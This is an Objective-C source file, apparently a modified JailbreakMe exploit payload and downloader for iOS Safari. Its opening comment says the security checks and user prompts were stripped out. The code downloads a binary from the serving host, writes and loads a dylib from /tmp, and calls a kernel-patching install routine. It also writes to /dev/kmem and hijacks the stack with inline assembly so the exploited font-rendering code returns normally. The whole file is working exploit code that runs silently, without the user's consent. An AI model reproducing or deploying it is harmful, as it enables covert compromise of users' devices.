/* 
 * Here is our patched exploit payload/downloader library. We've just removed
 * the minimal security checks placed by comex as well as UIKit pop-ups and
 * user prompts etc. Debugging messages have been left intact, though, to 
 * aid us in troubleshooting. -EM
 */

#include <stdlib.h>
#include <unistd.h>
#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <assert.h>
#include <pthread.h>
#include <dlfcn.h>
#include <CommonCrypto/CommonDigest.h>
#include <CoreGraphics/CoreGraphics.h>
#include <fcntl.h>
#include "common.h"
#include "dddata.h"
#include <objc/runtime.h>
#include <signal.h>

#define TESTING 0

/* 
 * We use our own MAGIC wad header different from that of the jailbreakme wad
 */
#define MAGIC 0xcdcdcdcd

/* 
 * The relative path to the wad file located on your server.
 */
#define WAD_PATH @"/wad.bin"

@interface NSObject (ShutUpGcc)
+ (id)sharedBrowserController;
- (id)tabController;
- (id)activeTabDocument;
-(void)loadURL:(id)url userDriven:(BOOL)driven;
@end

@interface Rude : NSObject {
    NSMutableData *wad;
    long long expectedLength;
    const char *freeze;
    int freeze_len;
    unsigned char *one;
    unsigned int one_len;
    NSURLConnection *connection;
    NSURL *base_url;
}
@end

static Rude *rude;
static BOOL is_hung;

@implementation Rude

- (id)initWithOne:(unsigned char *)one_ oneLen:(int)one_len_ {
    if(self = [super init]) {
        one = one_;
        one_len = one_len_;
    }
    return self;
}

static void unpatch() {
    int fd = open("/dev/kmem", O_RDWR);
    if(fd <= 0) goto fail;
    unsigned int things[2] = {1, 2}; // original values of staticmax, maxindex
    if(pwrite(fd, &things, sizeof(things), CONFIG_MAC_POLICY_LIST + 8) != sizeof(things)) goto fail;
    close(fd);
    setuid(501);
    return;
fail:
    NSLog(@"Unpatch failed!");
}

#if CONFIG_KILL_SB
static BOOL my_suspendForEventsOnly(id self, SEL sel, BOOL whatever) {
    system("killall SpringBoard");
    exit(1);
}

static void allow_quit() {
    Class cls = objc_getClass("Application"); // MobileSafari specific, thanks phoenix3200
    Method m;
    m = class_getInstanceMethod(cls, @selector(_suspendForEventsOnly:));
    method_setImplementation(m, (IMP) my_suspendForEventsOnly);
}
#endif

static void set_progress(float progress) {
    /* nop */
}

- (void)doStuff {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    void *handle = dlopen("/tmp/install.dylib", RTLD_LAZY);
    if(!handle) abort();
    void (*do_install)(const char *, int, void (*)(float), unsigned int, unsigned char *, unsigned int) = dlsym(handle, "do_install");

    do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH, one, one_len);

    NSLog(@"Um, I guess it worked.");
    unpatch();

#if CONFIG_KILL_SB
    allow_quit();
#endif

}


- (void)connection:(NSURLConnection *)connection_ didReceiveResponse:(NSURLResponse *)response {
    expectedLength = [response expectedContentLength];   
}

- (void)connection:(NSURLConnection *)connection_ didReceiveData:(NSData *)data {
    [wad appendData:data];
}

struct wad {
    unsigned int magic;
    unsigned int full_size;
    unsigned int first_part_size;
    unsigned char data[];
};

- (void)connectionDidFinishLoading:(NSURLConnection *)connection_ {
    [connection release];
    connection = nil;
    const struct wad *sw = [wad bytes];
    if([wad length] < sizeof(struct wad)) {
        NSLog(@"Error loading wad file: File received was truncated.");
        return;
    }
    if(sw->magic != MAGIC) {
        NSLog(@"Error loading wad file: File received was invalid.");
        return;
    }
    if([wad length] != sw->full_size) {
        NSLog(@"Error loading wad fileFile received was truncated.");
        return;
    }

    [[[wad subdataWithRange:NSMakeRange(sizeof(struct wad), sw->first_part_size)] inflatedData] writeToFile:@"/tmp/install.dylib" atomically:NO];
    freeze = &sw->data[sw->first_part_size];
    freeze_len = [wad length] - sizeof(struct wad) - sw->first_part_size;
  
    [NSThread detachNewThreadSelector:@selector(doStuff) toTarget:self withObject:nil];
    return;
}

- (void)connection:(NSURLConnection *)connection_ didFailWithError:(NSError *)error {
    [connection release];
    connection = nil;
}

- (void)start {
    wad = [[NSMutableData alloc] init];

    NSURL *pg_url = [[[[(id)objc_getClass("BrowserController") sharedBrowserController] tabController] activeTabDocument] URL];
    base_url = [NSURL URLWithString:[NSString stringWithFormat:@"%@://%@:%d", [pg_url scheme], [pg_url host], [[pg_url port] shortValue]]];

    NSURL *wad_url = [NSURL URLWithString:WAD_PATH relativeToURL:base_url];
    NSLog(@"Fetching %@", wad_url);
    connection = [[NSURLConnection alloc] initWithRequest:[NSURLRequest requestWithURL:wad_url] delegate:self];
}
@end

__attribute__((noinline))
void foo() {
    asm("");
}

static void bus() {
    is_hung = true;
    sleep((unsigned int) -1);
}

static void work_around_apple_bugs() {
    signal(SIGBUS, bus);
    //[DeveloperBannerView updateWithFileName:UTI:]:
}

void iui_go(unsigned char **ptr, unsigned char *one, unsigned int one_len) {
    NSLog(@"iui_go: one=%p one_len=%d", one, one_len);
    NSLog(@"*one = %d", (int) *one);
    work_around_apple_bugs();
    
    rude = [[Rude alloc] initWithOne:one oneLen:one_len];
    [rude performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:NO];
    
    // hmm.
    NSLog(@"ptr = %p; *ptr = %p; **ptr = %u", ptr, *ptr, (unsigned int) **ptr);
    **ptr = 0x0e; // endchar

    // mm.    
    unsigned int *top = pthread_get_stackaddr_np(pthread_self());
    size_t size = pthread_get_stacksize_np(pthread_self());
    unsigned int *bottom = (void *) ((char *)top - size);
    NSLog(@"top = %p size = %d", top, (int) size);
    unsigned int *addr = top;
    while(*--addr != 0xf00df00d) {
        if(addr == bottom) {
            NSLog(@"Couldn't find foodfood.");
#if TESTING
            [[NSData dataWithBytesNoCopy:bottom length:size freeWhenDone:NO] writeToFile:@"/var/mobile/Media/stack.bin" atomically:NO];
            NSLog(@"Stack written to /var/mobile/Media/stack.bin.");
#endif
            abort();
        }
    }
    NSLog(@"foodfood found at %p comparing to %p", addr, CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH);
    void *return_value;
    while(1) {
        if(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + ((CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1) ? 0x200 : 0x400)) {
            // Return to ft_path_builder_create_path_for_glyph
            NSLog(@"Returning to create_path_for_glyph");
            return_value = (void *) CGPathCreateMutable();
            goto returnx;
        }
        if(*addr >= CONFIG_GET_GLYPH_BBOXES && *addr < CONFIG_GET_GLYPH_BBOXES + 0x100) {
            NSLog(@"Returning to get_glyph_bboxes");
            return_value = NULL;
            goto returnx;
        }
        addr++;
        if(addr == top) {
            NSLog(@"We got back up to the top... ");
#if TESTING
            [[NSData dataWithBytesNoCopy:bottom length:size freeWhenDone:NO] writeToFile:@"/var/mobile/Media/stack.bin" atomically:NO];
            NSLog(@"Stack written to /var/mobile/Media/stack.bin.");
#endif
            abort();
        }
    }

    returnx:
    NSLog(@"Setting SP to %p - 7", addr);
    foo();
    addr -= 7;

    // get a return value.
    CGMutablePathRef path = CGPathCreateMutable();
    asm("mov sp, %0; mov r0, %1; pop {r8, r10, r11}; pop {r4-r7, pc}" ::"r"(addr), "r"(return_value));
}
